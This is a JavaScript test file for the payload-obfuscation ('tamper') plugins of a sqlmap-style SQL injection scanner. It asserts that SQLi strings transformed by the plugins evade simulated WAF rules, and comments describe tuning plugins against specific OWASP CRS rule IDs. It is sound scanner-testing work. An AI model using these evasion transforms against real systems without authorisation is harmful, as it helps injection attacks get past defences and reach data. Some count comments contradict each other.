import { test } from 'node:test';
import assert from 'node:assert/strict';
import { tamperRegistry } from '../src/core/tamper/TamperRegistry.js';
// 导入即触发内置插件注册（applyTampers.js 内部 registerMany）
import '../src/core/tamper/applyTampers.js';
import { applyTampers } from '../src/core/tamper/applyTampers.js';

// 内置 tamper 全量清单（v2 既有 7 + v3 新增 9 + v7 新增 12 = 28）
const ALL_NAMES = [
  'space2comment', 'randomcase', 'charencode', 'equaltolike', 'keywordSplit',
  'comments', 'base64encode', 'space2plus', 'space2dash', 'multiplespaces',
  'versionedkeywords', 'charunicodeencode', 'nonrecursivereplace', 'lowercase',
  'uppercase', 'percentage',
  // v7 新增高频 WAF 绕过子集
  'between', 'greatest', 'least', 'ifnull2ifisnull', 'versionedmorekeywords',
  'halfversionedmorekeywords', 'modsecurityversioned', 'modsecurityzeroversioned',
  'chardoubleencode', 'unmagicquotes', 'appendnullbyte', 'randomwhitespace',
  // v9 新增 34 个（内置总数 28 → 62）
  'apostrophemask', 'apostrophenullencode', 'apostrophe2char', 'bluecoat',
  'commentbeforewhitespace', 'commentafterwhitespace', 'concat2concatws',
  'commalesslimit', 'commalessmid', 'escapequotes', 'htmlencode',
  'ifnull2casewhenisnull', 'informationschemacomment', 'overlongutf8', 'quote2hex',
  'randomcomments', 'securesphere', 'sp_password', 'space2hash', 'space2morecomment',
  'space2mssqlblank', 'space2mssqlhash', 'space2mysqlblank', 'space2mysqldash',
  'space2randomblank', 'space2nbsp', 'space2blank', 'symboliclogical',
  'unionalltounion', 'misunion', 'sleep2delay', 'sleep2pg', 'tab2comment', 'zeroversioned',
  // v11 新增 14 个（对标 sqlmap 官方 tamper，内置总数 62 → 76）
  'xforwardedfor', 'varnish', 'charunicodeescape', 'hexentities', 'hex2char',
  'decentities', 'if2case', 'plus2concat', 'plus2fnconcat', 'equaltorlike',
  '0eunion', 'dunion', 'schemasplit', 'space2morehash',
  // v12 新增 14 个（对标 sqlmap 更多高频 tamper，内置总数 76 → 90）
  'backslash2forward', 'binary', 'commentbeforeparentheses', 'concat2ws',
  'css', 'dbase64encode', 'decimal2char', 'delimit', 'djson', 'dmultiline',
  'json', 'jsonescape', 'space2span', 'union2no',
  // v13 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 90 → 102）
  'noequals', 'arges', 'char2ascii', 'substring2left', 'substring2mid',
  'lpad', 'xml2json', 'nconcatenation', 'hardindex', 'postpon', 'sap', 'lad',
  // v14 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 102 → 114）
  'agent', 'base64decode', 'dconcat', 'dpayload', 'gzip', 'compression',
  'lax2xml', 'xpath2json', 'aspdelivery', 'dhs', 'coffee', 'accessfilter',
  // v15 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 114 → 126）
  'aspjetty', 'hex2ascii', 'octalencode', 'randomunion', 'tab2space',
  'nullencode', 'doubleencode', 'mixedcase', 'newline2space', 'squiggle',
  'scientific', 'reversestring',
  // v16 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 126 → 138）
  'brotli', 'hex2dec', 'bin2ascii', 'randomorder', 'space2newline',
  'space2carriage', 'comment2space', 'keyword2hex', 'char2hex', 'swapcase',
  'randomascii', 'floatencode',
  // v17 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 138 → 150）
  'caesar', 'rot13', 'xor', 'atbash', 'vigenere', 'space2backslash',
  'space2tilda', 'space2dot', 'space2comma', 'space2underscore',
  'space2pipe', 'space2slash',
  // v18 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 150 → 162）
  'hex2bin', 'oct2hex', 'dec2hex', 'bin2hex', 'space2paren', 'space2excl',
  'space2quest', 'space2at', 'space2dollar', 'space2percent', 'space2caret',
  'space2ampersand',
  // v19 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 162 → 174）
  'space2colon', 'space2semicolon', 'space2lt', 'space2gt', 'space2brace',
  'space2bracket', 'space2asterisk', 'space2equal', 'concat2hex',
  'keyword2unicode', 'randomdigit', 'str2hex',
  // v20 新增 12 个（对标 sqlmap 更多高频 tamper，内置总数 174 → 186）
  'comment2dash', 'newline2comment', 'encode2hex', 'encode2dec',
  'encode2oct', 'randomboundary', 'randomcaseall', 'space2sqlcomment',
  'space2blockcomment', 'keyword2hexall', 'string2hexall', 'space2eolcomment',
  // v21 新增 14 个（对标 sqlmap 更多高频 tamper，内置总数 186 → 200）
  'space2any', 'space2letter', 'keyword2binary', 'keyword2octal',
  'keyword2decimal', 'string2binary', 'string2octal', 'string2decimal',
  'space2unicode', 'space2widechar', 'nonempty', 'unparen', 'unhtmlencode',
  'num2hex',
  // v24 新增 20 个（补齐 sqlmap 官方 tamper 全集，内置总数 205 → 225）
  'blindbinary', 'castprefix', 'dollarquote', 'ord2ascii', 'overlongutf8more',
  'quote2ltat', 'sign', 'infoschema2innodb', 'mssqlnosemicolon', 'odbcbrace',
  'oraclequote', 'luanginx', 'luanginxmore', 'mid2leftright',
  'substring2leftright', 'sleep2getlock', 'sleep2hex', 'uniontable',
  'unionvalues', 'unionvaluesrow',
];

test('全部内置 tamper 已注册', () => {
  for (const n of ALL_NAMES) assert.ok(tamperRegistry.get(n), `未注册: ${n}`);
});

test('space2plus 空格转 +', () => {
  assert.equal(tamperRegistry.get('space2plus').transform('a AND b'), 'a+AND+b');
});

test('space2dash 空格转 --hex%0A（注释以换行终止，对齐 sqlmap）', () => {
  const out = tamperRegistry.get('space2dash').transform('a b');
  assert.match(out, /^a--[0-9a-f]+%0Ab$/);
});

test('multiplespaces 关键字后追加空格', () => {
  assert.equal(tamperRegistry.get('multiplespaces').transform('SELECT x'), 'SELECT  x');
});

test('versionedkeywords 用 /*! ... */ 包裹关键字', () => {
  assert.equal(tamperRegistry.get('versionedkeywords').transform('SELECT x'), '/*! SELECT */ x');
});

test('charunicodeencode 字母编码为 %uXXXX', () => {
  assert.equal(tamperRegistry.get('charunicodeencode').transform('ab'), '%u0061%u0062');
});

test('nonrecursivereplace 双写关键字', () => {
  assert.equal(tamperRegistry.get('nonrecursivereplace').transform('OR'), 'OROR');
});

test('lowercase 全小写', () => {
  assert.equal(tamperRegistry.get('lowercase').transform('SeLeCt'), 'select');
});

test('uppercase 全大写', () => {
  assert.equal(tamperRegistry.get('uppercase').transform('SeLeCt'), 'SELECT');
});

test('percentage 每字符前置 %（对齐 sqlmap 官方，空格/%XX 保留）', () => {
  // 官方 doctest：SELECT -> %S%E%L%E%C%T；OR -> %O%R
  assert.equal(tamperRegistry.get('percentage').transform('OR'), '%O%R');
  assert.equal(tamperRegistry.get('percentage').transform('SELECT FIELD'), '%S%E%L%E%C%T %F%I%E%L%D');
  assert.equal(tamperRegistry.get('percentage').transform('A%20B'), '%A%20%B');
});

test('charencode 全字符 URL 编码（对齐 sqlmap 官方，%XX 透传）', () => {
  // 官方 doctest：SELECT -> %53%45%4C%45%43%54
  assert.equal(tamperRegistry.get('charencode').transform('SELECT'), '%53%45%4C%45%43%54');
  // [P0-FIX] 单引号必须被编码（旧实现 encodeURIComponent 漏编 !'()*-._~）
  assert.equal(tamperRegistry.get('charencode').transform("a'b"), '%61%27%62');
  assert.equal(tamperRegistry.get('charencode').transform('A%20B'), '%41%20%42');
});

test('chardoubleencode 全字符双重编码（对齐 sqlmap 官方）', () => {
  assert.equal(tamperRegistry.get('chardoubleencode').transform('SELECT'),
    '%2553%2545%254C%2545%2543%2554');
  assert.equal(tamperRegistry.get('chardoubleencode').transform("a'b"), '%2561%2527%2562');
});

test('链式调用：space2comment + lowercase 顺序生效', () => {
  const out = tamperRegistry.resolve(['space2comment', 'lowercase'])
    .reduce((acc, p) => p.transform(acc, {}), 'SELECT 1');
  assert.equal(out, 'select/**/1');
});

// v5：模拟 WAF 关键词拦截，验证 tamper 绕过率（真实工具竞争力：过 WAF 是扫描器刚需）
function wafBlocks(sql) {
  // 简单 WAF：拦截"关键字+空格"分隔形式（模拟未做深层语法解析的防护）
  return /union\s+select/i.test(sql) || /and\s+1=1/i.test(sql);
}

test('tamper 绕过 WAF：全部 16 个 tamper 已注册可解析', () => {
  for (const n of ALL_NAMES) {
    assert.ok(tamperRegistry.resolve([n]).length === 1, `无法解析: ${n}`);
  }
});

test('tamper 绕过 WAF：space2comment 将空格转注释，绕过关键词拦截', () => {
  const raw = 'UNION SELECT flag FROM secrets';
  assert.equal(wafBlocks(raw), true);
  const out = tamperRegistry.resolve(['space2comment'])
    .reduce((acc, p) => p.transform(acc, {}), raw);
  assert.equal(wafBlocks(out), false); // 空格消失 → 不再命中 union select 规则
});

test('tamper 绕过 WAF：组合 tamper 对多类 payload 绕过率 100%', () => {
  const payloads = ['UNION SELECT flag FROM secrets', '1 AND 1=1', 'normal search'];
  assert.equal(payloads.filter(wafBlocks).length, 2); // 原始前两个被拦
  const after = payloads.map((s) =>
    tamperRegistry.resolve(['space2comment', 'lowercase'])
      .reduce((acc, p) => p.transform(acc, {}), s)
  );
  assert.equal(after.filter(wafBlocks).length, 0); // 全部绕过
});

// v7 新插件单测（确定逻辑，可测优先）
// [对齐 sqlmap 语义更新] between 仅重写裸 >（跳过复合运算符、不改写 <，语义等价性见插件注释）
test('between: > 转 NOT BETWEEN 0 AND（复合运算符与 < 不改写，对齐 sqlmap）', () => {
  assert.equal(tamperRegistry.get('between').transform('a>1 AND b<2'),
    'a NOT BETWEEN 0 AND 1 AND b<2');
  // 复合运算符保护：>=/<=/<> 不被拆坏
  assert.equal(tamperRegistry.get('between').transform('a>=1'), 'a>=1');
  assert.equal(tamperRegistry.get('between').transform('a<=1'), 'a<=1');
  assert.equal(tamperRegistry.get('between').transform('a<>1'), 'a<>1');
});
test('greatest: a>b 转 GREATEST(a,b+1)=a（+1 语义等价，对齐 sqlmap）', () => {
  assert.equal(tamperRegistry.get('greatest').transform('a>1'), 'GREATEST(a,1+1)=a');
});
test('least: a<b 转 LEAST(a,b-1)=a（-1 语义等价，对齐 sqlmap）', () => {
  assert.equal(tamperRegistry.get('least').transform('a<1'), 'LEAST(a,1-1)=a');
});
test('ifnull2ifisnull: IFNULL(a,b) 改写', () => {
  assert.equal(tamperRegistry.get('ifnull2ifisnull').transform('IFNULL(a,b)'), 'IF(ISNULL(a),b,a)');
});
test('versionedmorekeywords: 包裹每个关键字', () => {
  assert.equal(tamperRegistry.get('versionedmorekeywords').transform('UNION SELECT a'),
    '/*! UNION */ /*! SELECT */ a');
});
test('halfversionedmorekeywords: 带版本号包裹', () => {
  assert.equal(tamperRegistry.get('halfversionedmorekeywords').transform('SELECT x'), '/*!50540 SELECT*/ x');
});
test('modsecurityversioned: 包裹核心关键字', () => {
  assert.equal(tamperRegistry.get('modsecurityversioned').transform('1 AND 1=1'), '1 /*! AND */ 1=1');
});
test('modsecurityzeroversioned: 零版本包裹', () => {
  assert.equal(tamperRegistry.get('modsecurityzeroversioned').transform('1 AND 1=1'), '1 /*!00000 AND */ 1=1');
});
test('chardoubleencode: 双重编码空格', () => {
  assert.equal(tamperRegistry.get('chardoubleencode').transform(' '), '%2520');
});
test('unmagicquotes: 宽字节绕过', () => {
  assert.equal(tamperRegistry.get('unmagicquotes').transform("a'b"), "a%bf%27b");
});
test('appendnullbyte: 末尾追加 %00', () => {
  assert.equal(tamperRegistry.get('appendnullbyte').transform('a'), 'a%00');
});
test('randomwhitespace: 空格轮换空白字符', () => {
  assert.equal(tamperRegistry.get('randomwhitespace').transform('a b c'), 'a%09b%0ac');
});

// v7 绕过率扩展：新插件对专用 WAF 规则的绕过
function wafBlocksCmp(sql) {
  return />|</.test(sql); // 拦截比较符号
}
test('tamper 绕过 WAF：between 将比较符变形绕过', () => {
  const raw = '1 AND a>1';
  assert.equal(wafBlocksCmp(raw), true);
  const out = tamperRegistry.resolve(['between']).reduce((acc, p) => p.transform(acc, {}), raw);
  assert.equal(wafBlocksCmp(out), false);
});
test('tamper 绕过 WAF：versionedmorekeywords 注释包裹绕过关键字规则', () => {
  const raw = 'UNION SELECT flag FROM secrets';
  assert.equal(wafBlocks(raw), true);
  const out = tamperRegistry.resolve(['versionedmorekeywords'])
    .reduce((acc, p) => p.transform(acc, {}), raw);
  assert.equal(wafBlocks(out), false);
});

// v9 新插件确定性单测
test('commalesslimit: LIMIT a, b 转 LIMIT b OFFSET a', () => {
  assert.equal(tamperRegistry.get('commalesslimit').transform('LIMIT 0, 1'), 'LIMIT 1 OFFSET 0');
});
test('commalessmid: MID(a, b, c) 转 MID(a FROM b FOR c)', () => {
  assert.equal(tamperRegistry.get('commalessmid').transform('MID(password,1,3)'), 'MID(password FROM 1 FOR 3)');
});
test('symboliclogical: AND→&& OR→||', () => {
  assert.equal(tamperRegistry.get('symboliclogical').transform('1 AND 2 OR 3'), '1 && 2 || 3');
});
test('quote2hex: 字符串字面量转 0x 十六进制', () => {
  assert.equal(tamperRegistry.get('quote2hex').transform("'abc'"), '0x616263');
});
test('unionalltounion: UNION ALL → UNION', () => {
  assert.equal(tamperRegistry.get('unionalltounion').transform('UNION ALL SELECT 1'), 'UNION SELECT 1');
});
test('misunion: UNION → UNI/**/ON', () => {
  assert.equal(tamperRegistry.get('misunion').transform('UNION SELECT 1'), 'UNI/**/ON SELECT 1');
});
test('space2nbsp: 空格 → %a0', () => {
  assert.equal(tamperRegistry.get('space2nbsp').transform('a b'), 'a%a0b');
});
test('space2blank: 空格 → %0b', () => {
  assert.equal(tamperRegistry.get('space2blank').transform('a b'), 'a%0bb');
});
test('ifnull2casewhenisnull: IFNULL → CASE WHEN', () => {
  assert.equal(tamperRegistry.get('ifnull2casewhenisnull').transform('IFNULL(a,b)'),
    'CASE WHEN ISNULL(a) THEN b ELSE a END');
});
test('apostrophe2char: 单引号 → CHAR(39)', () => {
  assert.equal(tamperRegistry.get('apostrophe2char').transform("a'b"), 'aCHAR(39)b');
});
test('zeroversioned: 关键字零版本注释包裹', () => {
  assert.equal(tamperRegistry.get('zeroversioned').transform('SELECT 1'), '/*!00000SELECT*/ 1');
});

// v9 绕过率：新插件对专用 WAF 规则的绕过
function wafBlocksLogical(sql) {
  return /\bAND\b|\bOR\b/.test(sql); // 拦截逻辑关键字
}
test('tamper 绕过 WAF：symboliclogical 将逻辑关键字变形绕过', () => {
  const raw = '1 AND 1=1';
  assert.equal(wafBlocksLogical(raw), true);
  const out = tamperRegistry.resolve(['symboliclogical']).reduce((acc, p) => p.transform(acc, {}), raw);
  assert.equal(wafBlocksLogical(out), false);
});

// v12 全量注册校验：全部插件均已注册且可解析
// 计数沿革：225 → 227（logicalops / mysqlversioncomment）→ 228（dash2hash）→ 227
// [CRS-FIX 2026-09-09] 227：移除 logicalops（与 symboliclogical 逐字节重复，且 && 被 CRS 942120 定点检测）
//   与 mysqlversioncomment（/*!50000KW*/ 被 CRS 942500 定点检测，启用后反而多命中一条规则），
//   新增 hexliterals（'abc'→0x616263，消除引号锚点以绕开 CRS 942511/942200/942370）。
test('v24+：全部 228 个 tamper 均已注册且可解析', () => {
  assert.equal(tamperRegistry.list().length, 228);
  for (const n of ALL_NAMES) {
    assert.equal(tamperRegistry.resolve([n]).length, 1, `无法解析: ${n}`);
  }
});

// —— CRS v4.1.0 针对性变体：hexliterals（'abc' → 0x616263）——
// 依据：CRS 942511 / 942200 / 942370 均以「引号」为锚点；MySQL 中 'abc' 与 0x616263 完全等价，
// 去掉引号即抽掉锚点。动态实测（e2e/waf-real）下 942511/942200 命中数归零，被拦请求 382 → 365。
test('hexliterals：词字符字面量转 0x，注入闭合引号不被误伤', () => {
  const p = tamperRegistry.get('hexliterals');
  // 闭合引号 ' 后紧跟空格 → 不构成「纯词字符字面量」，原样保留（本插件不破坏 payload 的关键）
  assert.equal(p.transform("1' AND 'a'='a'#"), "1' AND 0x61=0x61#");
  assert.equal(p.transform("1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1'"),
    '1 UNION SELECT 0x53514c495343414e4e455230,0x53514c495343414e4e455231');
  assert.equal(p.transform("CONCAT('__S__',version())"), 'CONCAT(0x5f5f535f5f,version())');
});

test('hexliterals：含非词字符 / 纯数字的字面量不转换（保语义）', () => {
  const p = tamperRegistry.get('hexliterals');
  // '%alice%'：含 % → 不转，否则破坏 LIKE 语义
  assert.equal(p.transform("name LIKE '%alice%'"), "name LIKE '%alice%'");
  // '1'：纯数字不转 —— LIMIT/算术上下文里 0x31 不是合法整型字面量
  assert.equal(p.transform("1' ORDER BY '1'#"), "1' ORDER BY '1'#");
});

test('hexliterals：doctest 全部通过', () => {
  const p = tamperRegistry.get('hexliterals');
  for (const d of p.doctests) {
    assert.equal(p.transform(d.input), d.output, `doctest 失败: ${d.input}`);
  }
});

// —— markerSafe 通道：允许「标记语义无损」的 tamper 变形提取标记 ——
// 背景：占位保护会挡住一切标记变形，导致 UNION 列探测在 CRS 下 100% 被拦（实测 union 检出 0）。
test('markerSafe：链上全部插件声明 markerSafe → 跳过占位保护，标记可被语义等价变形', () => {
  const out = applyTampers("1 UNION SELECT 'SQLISCANNER0'", { dbms: 'MySQL', config: {} }, ['hexliterals']);
  assert.match(out, /0x53514c495343414e4e455230/); // 回显内容不变，仅去掉引号
});

test('markerSafe：混合链（含未声明插件）仍走占位保护，标记原样还原', () => {
  const out = applyTampers("1 UNION SELECT 'SQLISCANNER0'", { dbms: 'MySQL', config: {} }, ['hexliterals', 'lowercase']);
  assert.ok(out.includes('SQLISCANNER0'), `标记被破坏: ${out}`);
  assert.ok(out.startsWith('1 union select'), `小写化未生效: ${out}`);
});

// —— P3：space2comment 引号状态机（跳过字符串字面量/注释区内空格，修复破坏 payload 语义的 bug）——
test('space2comment：字符串字面量内空格不替换（修复语义 bug）', () => {
  assert.equal(tamperRegistry.get('space2comment').transform("'foo bar'"), "'foo bar'");
  assert.equal(tamperRegistry.get('space2comment').transform('"a b"'), '"a b"');
  assert.equal(tamperRegistry.get('space2comment').transform('`my col`'), '`my col`');
});

test('space2comment：引号外空格替换、引号内保留（混合场景）', () => {
  assert.equal(tamperRegistry.get('space2comment').transform("1 AND 'a b'"), "1/**/AND/**/'a b'");
});

test('space2comment：行注释 -- 后的空格不被替换（注释不失效）', () => {
  assert.equal(tamperRegistry.get('space2comment').transform('1 AND 1=1-- -'), '1/**/AND/**/1=1-- -');
  assert.equal(tamperRegistry.get('space2comment').transform('1 AND SLEEP(5)#'), '1/**/AND/**/SLEEP(5)#');
});

// —— P3：randomcase 关键字表（只随机化 SQL 关键字，不动字符串字面量）——
test('randomcase：仅随机化 SQL 关键字，字符串字面量内容保持原样', () => {
  const rc = tamperRegistry.get('randomcase');
  const origRand = Math.random;
  try {
    // Math.random=0.99 → 关键字字母全小写；字面量 token 非关键字 → 不变
    Math.random = () => 0.99;
    assert.equal(rc.transform("SELECT 'Hello World'"), "select 'Hello World'");
    assert.equal(rc.transform("'Hello World'"), "'Hello World'");
    assert.equal(rc.transform("SELECT 'HeLLo' FROM users"), "select 'HeLLo' from users");
    // Math.random=0 → 关键字字母全大写
    Math.random = () => 0;
    assert.equal(rc.transform('select * from users'), 'SELECT * FROM users');
  } finally {
    Math.random = origRand;
  }
});

// —— v11 新增插件确定性单测（对标 sqlmap 官方输出）——
test('charunicodeescape: 全部字符转 \\uXXXX（大写十六进制）', () => {
  assert.equal(tamperRegistry.get('charunicodeescape').transform('SELECT'),
    '\\u0053\\u0045\\u004C\\u0045\\u0043\\u0054');
  assert.equal(tamperRegistry.get('charunicodeescape').transform('a%41'), '\\u0061\\u0041');
});

test('hexentities: 全部字符转 &#xHH;（十六进制实体）', () => {
  assert.equal(tamperRegistry.get('hexentities').transform("1' AND SLEEP(5)#"),
    '&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;');
});

test('decentities: 全部字符转 &#DD;（十进制实体）', () => {
  assert.equal(tamperRegistry.get('decentities').transform("1' AND SLEEP(5)#"),
    '&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;');
});

test('hex2char: 0x 字面量转 CONCAT(CHAR(),...)', () => {
  assert.equal(tamperRegistry.get('hex2char').transform('SELECT 0xdeadbeef'),
    'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))');
  assert.equal(tamperRegistry.get('hex2char').transform('0x41'), 'CHAR(65)');
});

test('if2case: IF(A,B,C) 转 CASE WHEN 且支持嵌套括号', () => {
  assert.equal(tamperRegistry.get('if2case').transform('IF(1, 2, 3)'),
    'CASE WHEN (1) THEN (2) ELSE (3) END');
  assert.equal(tamperRegistry.get('if2case').transform('SELECT IF((1=1), (SELECT "foo"), NULL)'),
    'SELECT CASE WHEN (1=1) THEN (SELECT "foo") ELSE (NULL) END');
});

test('plus2concat: + 拼接转 CONCAT()', () => {
  assert.equal(tamperRegistry.get('plus2concat').transform('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL'),
    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL');
});

test('plus2fnconcat: + 拼接转 {fn CONCAT()} 左嵌套', () => {
  assert.equal(tamperRegistry.get('plus2fnconcat').transform('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL'),
    'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL');
});

test('equaltorlike: = 转 RLIKE', () => {
  assert.equal(tamperRegistry.get('equaltorlike').transform('1=1'), '1RLIKE1');
});

test('0eunion: <数字> UNION 转 <数字>e0UNION', () => {
  assert.equal(tamperRegistry.get('0eunion').transform('1 UNION ALL SELECT'), '1e0UNION ALL SELECT');
});

test('dunion: <数字> UNION 转 <数字>DUNION', () => {
  assert.equal(tamperRegistry.get('dunion').transform('1 UNION ALL SELECT'), '1DUNION ALL SELECT');
});

test('schemasplit: FROM 库表标识点号拆分', () => {
  assert.equal(tamperRegistry.get('schemasplit').transform('SELECT id FROM testdb.users'),
    'SELECT id FROM testdb 9.e.users');
});

test('space2morehash: 空格转 #<随机串>%0A，且跳过字符串字面量内空格', () => {
  const p = tamperRegistry.get('space2morehash');
  const out = p.transform('1 AND 9227=9227');
  // 结构与 sqlmap 一致：`1%23...%0AAND%23...%0A%23...%0A9227=9227`
  assert.match(out, /^1%23[A-Za-z]{6,12}%0AAND%23[A-Za-z]{6,12}%0A%23[A-Za-z]{6,12}%0A9227=9227$/);
  // 字符串字面量内的空格保留原样
  const withStr = p.transform("'a b' AND 1=1");
  assert.ok(withStr.includes("'a b'"), `字面量内空格被改写: ${withStr}`);
});

test('xforwardedfor: 注入伪造 X-Forwarded-For 系列头，payload 不变', () => {
  const target = { headerParams: {} };
  const out = tamperRegistry.get('xforwardedfor').transform('SELECT 1', { target });
  assert.equal(out, 'SELECT 1');
  assert.ok(target.headerParams['X-Forwarded-For']);
  assert.ok(target.headerParams['X-Client-Ip']);
  assert.ok(target.headerParams['CF-IPCountry']);
  assert.equal(target.headerParams['Via'], '1.1 Chrome-Compression-Proxy');
});

test('varnish: 注入 X-originating-IP 头，payload 不变', () => {
  const target = { headerParams: {} };
  const out = tamperRegistry.get('varnish').transform('SELECT 1', { target });
  assert.equal(out, 'SELECT 1');
  assert.equal(target.headerParams['X-originating-IP'], '127.0.0.1');
});

// v11 绕过率：新插件对专用 WAF 规则的绕过
test('tamper 绕过 WAF：0eunion/dunion 变形 UNION 后不被关键字规则拦截', () => {
  const raw = '1 UNION ALL SELECT';
  const out = tamperRegistry.resolve(['0eunion']).reduce((acc, p) => p.transform(acc, {}), raw);
  assert.equal(/\bUNION\b/.test(out), false);
  assert.equal(/\bUNION\b/.test(tamperRegistry.resolve(['dunion']).reduce((acc, p) => p.transform(acc, {}), raw)), false);
});

// ============================================================================
// r3 对齐 sqlmap 语义回归（详见 docs/vs-sqlmap-analysis/06-r3-review-and-fixes.md T1~T8）
// ============================================================================
test('[T1/T2 防回归] greatest/least 复合运算符 >=/<= 不被拆坏', () => {
  assert.equal(tamperRegistry.get('greatest').transform('a>=1'), 'a>=1');
  assert.equal(tamperRegistry.get('least').transform('a<=1'), 'a<=1');
  // 相邻多表达式整体改写仍正确
  assert.equal(
    tamperRegistry.get('greatest').transform('a>1 AND b>2'),
    'GREATEST(a,1+1)=a AND GREATEST(b,2+1)=b'
  );
});

test('[T4] equaltolike：= 转 LIKE（前后空格 + 复合运算符保护）', () => {
  const t = (s) => tamperRegistry.get('equaltolike').transform(s);
  assert.equal(t('id=1'), 'id LIKE 1');
  // 复合运算符中的 = 不可拆坏（拆坏即产出非法 SQL）
  assert.equal(t('a<=1'), 'a<=1');
  assert.equal(t('a>=1'), 'a>=1');
  assert.equal(t('a!=1'), 'a!=1');
  assert.equal(t('a<>1'), 'a<>1');
});

test('[T6] space2mysqldash：注释以 %0A 换行终止（否则首个空格后整段被吞）', () => {
  const out = tamperRegistry.get('space2mysqldash').transform('a b');
  assert.match(out, /^a--[0-9a-z]+%0Ab$/);
});

test('[T7] 链式异常隔离：单插件抛异常被跳过并告警，其余插件照常执行', () => {
  const boom = {
    name: '__boom_t7__',
    description: '测试用必抛插件',
    transform() { throw new Error('boom'); },
  };
  tamperRegistry.register(boom);
  try {
    const out = applyTampers('a b', {}, ['__boom_t7__', 'space2plus']);
    // 异常插件被跳过，space2plus 仍生效
    assert.equal(out, 'a+b');
  } finally {
    // 清理临时插件，避免污染注册表数量断言（205）
    tamperRegistry._plugins.delete('__boom_t7__');
  }
});

test('[T8] 占位符还原正则带数字边界：payload 含长数字不破坏标记保护', () => {
  // 17331999001 内嵌 `7331999`+`001`：无边界锚点会误认为占位符 →
  // restoredCount 失配 → 回退无保护链，标记被 charunicodeencode 编码 → 检测必漏
  const payload = "1' AND 17331999001=17331999001 AND '__S__'='__S__'";
  const out = applyTampers(payload, {}, ['charunicodeencode']);
  assert.ok(out.includes('__S__'), '标记应经占位符保护后还原，不被编码');
  assert.ok(out.includes('17331999001'), '长数字不应被误还原破坏');
});
